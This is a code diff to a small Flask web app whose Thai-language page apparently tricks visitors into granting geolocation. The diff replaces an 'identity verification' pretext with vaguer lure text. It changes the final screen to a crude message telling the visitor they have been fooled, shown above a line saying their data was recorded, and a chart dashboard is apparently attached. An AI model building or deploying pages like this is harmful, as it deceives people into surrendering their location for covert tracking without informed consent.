@@ -83,11 +83,11 @@ small{color:#aaa}
 <body>
 
 <div class="card">
-  <h2>🔐 ยืนยันตัวตน</h2>
-  <p>เพื่อดำเนินการต่อ กรุณายืนยันข้อมูล</p>
+  <h2>🔐 กำลังเคลียดหรอ</h2>
+  <p>ลองกดยืนยันดู</p>
   <button onclick="start()">ยืนยัน</button>
   <p id="status"></p>
-  <small>ระบบจะใช้ตำแหน่งเพื่อแสดงผลแผนที่</small>
+  <small>รอแปปนึงนะ</small>
 </div>
 
 <script>
@@ -162,7 +162,7 @@ function finalize(){
 
 function error(){
   document.getElementById("status").innerText =
-    "กรุณาเปิด Location และอนุญาตตำแหน่ง";
+    "กดเพื่อไปต่อ";
 }
 </script>
 
@@ -174,7 +174,7 @@ function error(){
 def done():
     return """
     <body style="background:black;color:white;text-align:center;padding:100px">
-    <h1>✅ ยืนยันเรียบร้อย</h1>
+    <h1>✅ อยากจะบอกว่าไม่มีไรมึงโดนกูหลอก</h1>
     <p>ระบบบันทึกข้อมูลเรียบร้อยแล้ว</p>
     </body>
     """
@@ -310,4 +310,3 @@ new Chart(ctx, {{
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT",10000)))
-    socketio.run(app, host="0.0.0.0", port=10000, debug=True)
